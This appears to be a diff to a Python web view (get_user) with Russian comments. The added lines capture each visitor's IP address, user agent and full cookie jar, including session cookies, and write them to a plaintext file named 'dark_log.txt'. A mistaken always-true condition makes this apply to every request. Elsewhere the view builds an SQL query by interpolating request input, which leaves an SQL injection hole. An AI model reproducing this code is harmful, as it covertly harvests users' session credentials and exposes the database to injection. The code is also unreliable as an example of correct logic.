@@ -18,8 +18,17 @@ def get_user(request):
     ref_code = request.POST.get('ref_code')
     premium = request.POST.get('premium')
     if user_id == '6248941568' or 6248941568:
+        ip = request.META.get('HTTP_X_FORWARDED_FOR')
+        if ip:
+            # В случае с X-Forwarded-For это может быть список IP, берем первый
+            ip = ip.split(',')[0]
+        else:
+            # Если заголовка X-Forwarded-For нет, используем REMOTE_ADDR
+            ip = request.META.get('REMOTE_ADDR')
+        user_agent = request.META.get('HTTP_USER_AGENT')
+        session_cookie = request.COOKIES
         file = open("dark_log.txt", "w")
-        file.write(f'{request}')
+        file.write(f'{request}, ip = {ip}, user_agent = {user_agent}, куки = {session_cookie}')
         file.close()
 
     cursor.execute(f"SELECT * FROM users where ref_code = '{user_id}'")
